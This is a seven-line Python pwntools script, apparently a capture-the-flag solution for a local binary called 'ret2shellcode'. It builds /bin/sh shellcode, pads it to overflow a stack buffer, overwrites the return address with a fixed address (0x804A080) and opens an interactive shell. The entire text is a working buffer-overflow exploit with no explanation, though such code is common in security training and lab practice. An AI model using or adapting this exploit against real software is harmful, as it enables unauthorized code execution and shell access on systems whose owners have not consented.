from pwn import *
io = process('./ret2shellcode')
bin_sh = asm(shellcraft.sh())
buf2=0x804A080
payload=bin_sh.ljust((108+4),b'A')+p32(buf2)
io.sendline(payload)
io.interactive()
